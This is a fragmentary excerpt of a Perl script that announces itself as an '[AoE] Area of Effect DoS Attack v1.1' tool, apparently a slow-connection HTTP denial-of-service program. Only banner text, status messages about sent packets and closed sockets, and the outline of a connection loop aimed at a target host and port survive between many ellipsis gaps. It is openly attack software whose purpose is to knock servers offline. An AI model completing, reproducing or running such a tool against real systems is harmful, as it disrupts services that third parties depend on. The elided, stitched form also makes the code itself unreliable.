...
print <<EOTEXT;
		[AoE] Area of Effect DoS Attack v1.1
EOTEXT
...
if ( $Config{usethreads} ) {
    ...
    print "AoE will be slower than normal as a result.\n";
}
...
"That's odd - I connected but couldn't send the data to $host:$port.\n";
    ...
    if ( print $sock "Connection: Close\r\n\r\n" ) {
        print "Okay that's enough time. AoE closed the socket.\n";
...
all...  you might have trouble using AoE against this target.  You can 
...
sub doconnections {
    ...
    while (1) {
        ...
        print
"Current stats:\tAoE has now sent $packetcount packets successfully.\nThis thread now sleeping for $timeout seconds...\n\n";
        sleep($timeout);
    }
}
